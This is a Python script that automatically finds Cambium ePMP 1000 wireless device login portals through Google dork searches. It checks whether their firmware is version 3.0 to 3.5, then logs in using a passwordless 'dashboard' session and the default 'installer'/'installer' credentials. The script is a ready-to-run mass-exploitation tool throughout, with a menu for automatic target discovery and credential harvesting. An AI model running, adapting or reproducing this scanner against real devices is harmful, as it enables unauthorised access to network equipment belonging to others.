#!/usr/bin/env python3
from bs4 import BeautifulSoup
import sys
import time
import requests

banner = '''
        ____  __  _______     _______  ____  ____ 
  ___  / __ \/  |/  / __ \   <  / __ \/ __ \/ __ \ 
 / _ \/ /_/ / /|_/ / /_/ /   / / / / / / / / / / / 
/  __/ ____/ /  / / ____/   / / /_/ / /_/ / /_/ /  
\___/_/   /_/  /_/_/       /_/\____/\____/\____/  
                                     v3.0 - v3.5                                                

 ~ This script automatically finds ePMP 1000 web portals and
   automatically check which version they're running if they're
   runnning v3.0 - v3.5,it will automatically uses default creds
   to login and return if portal is vulnerable or not
'''


def find_target(start,page_amt):
    try:
        print('[~] Gathering targets')
        page = start
        for i in range(page_amt):
            page+=1 
            url = 'https://google.com/search?q=intitle:ePMP 1000 intext:Log In -site:*.com -site:com.*&start=%s' % page
            headers = {'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'}
            response = requests.get(url, headers=headers, timeout = 20)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, "html.parser")
                for link in soup.find_all('div', class_='r'):
                    addr = link.find_all('a')

                    if addr:
                        portal = addr[0]['href']
                        portals.append(portal)
            
            time.sleep(5)
            sys.stdout.write('\r[~] Google page: %s' % page)
            sys.stdout.flush()    

        sys.stdout.write('\r[*] Found %s targets\n' % len(portals))
        sys.stdout.flush()    
        print('-'*60)

    except Exception:
        print('\n\033[1;91m[!]\033[m Something went wrong,execute the script again')
        pass


def get_version(portal):
    try:
        response = requests.get(portal, timeout = 10)
        soup = BeautifulSoup(response.content, "html.parser")
        links = soup.find_all('a')
        
        for link in links:
            content = link.find_all('span')
            link = link['href']
            if link == 'https://support.cambiumnetworks.com/files/epmp/':
                for version in content:
                    version = str(version.string).strip()                    

                    if version.startswith('3.0'):
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    elif version.startswith('3.1'):
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    elif version.startswith('3.2'):
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    elif version.startswith('3.3'):
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    elif version.startswith('3.4'):
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    elif version == '3.5':
                        print('\n\033[1;92m[*]\033[m Portal :',portal)
                        print('\033[1;94m[+]\033[m Status : Vulnerable')
                        print('\033[1;94m[+]\033[m Version:',version)
                        vuln_portals.append(portal)

                    else:
                        print('\n[*] Portal :',portal)
                        print('[+] Status : Not Vulnerable')
                        print('[+] Version:',version)
                        
    except Exception:
        print('\n\033[1;91m[!]\033[m Can\'t get version from',portal)
        pass


def get_cookies(portal):
    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'
    url = portal+'cgi-bin/luci'
    
    headers = { 'X-Requested-With' : 'XMLHttpRequest',
                'Accept' : 'application/json, text/javascript, */*; q=0.01'}
    
    data ={'username' : 'dashboard',
            'password' : ''}

    response = session.post(url, data = data, headers = headers, timeout=10)    
    prevsessid = response.text
    prevsessid = prevsessid.split('stok": "',1)[1]
    prevsessid = prevsessid.split('", "',1)[0]
    RequestsCookieJar = session.cookies

    cookie_name = ''
    cookie_value = ''

    for cookie in RequestsCookieJar:
        cookie_name = cookie.name
        cookie_value = cookie.value

    return cookie_name, cookie_value, prevsessid


def try_login(portal, cookie_name, cookie_value, prevsessid):
    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0'
    url = portal+'cgi-bin/luci'
    
    headers = { 'X-Requested-With' : 'XMLHttpRequest',
                'Accept' : 'application/json, text/javascript, */*; q=0.01',
                'Connection' : 'close'}

    data ={'username' : 'installer',
            'password' : 'installer',
            'prevsess' : prevsessid}
    
    cookie = {cookie_name : cookie_value}

    response = session.post(url, data=data, headers=headers, cookies=cookie)
    
    if 'auth_failed' in response.text:
        print('\033[1;91m[!]\033[m Login failed')
    
    else:
        print('\033[1;92m[*]\033[m Login successful')
        print('\033[1;94mUSERNAME\033[m : \033[1;92minstaller\033[m\n\033[1;94mPASSWORD\033[m : \033[1;92minstaller\033[m')


#--------------------------------------------------------------------------------------------#
def bulk():
    for portal in portals:
        get_version(portal)
        

def chk_pwn():
    for vuln_portal in vuln_portals:
        print('\n\033[1;92m[*]\033[m Trying to login to:',vuln_portal)
        cookie_name, cookie_value, prevsessid = get_cookies(vuln_portal)
        try_login(vuln_portal,cookie_name, cookie_value, prevsessid)


def auto_target(start,page_amt):
    find_target(start,page_amt)
    bulk()
    chk_pwn()


def user_defined_target(target):
    get_version(target)
    if len(vuln_portals) != 0:  
        for vuln_portal in vuln_portals:
            if vuln_portal:
                cookie_name, cookie_value, prevsessid = get_cookies(vuln_portal)
                try_login(vuln_portal,cookie_name, cookie_value, prevsessid)


def choice():
    print(banner)
    selection = input('[1] Automatically find and return credintials\n[2] I have target\n[?] Select: ')
    
    if selection == '1':
        start = int(input('[?] Input the page you want to start searching from: '))
        page_amt = int(input('[?] Input the amount of google search pages to find: '))
        print('-'*60)
        auto_target(start,page_amt)

    elif selection == '2':
        target = input('[?] Input Target: ')
        print('-'*60)
        user_defined_target(target)
    
    else:
        print('[!] Invalid selection!')


#--------------------------------------------------------------------------------------------#
if __name__ == '__main__':
    portals = []
    vuln_portals = []
    choice()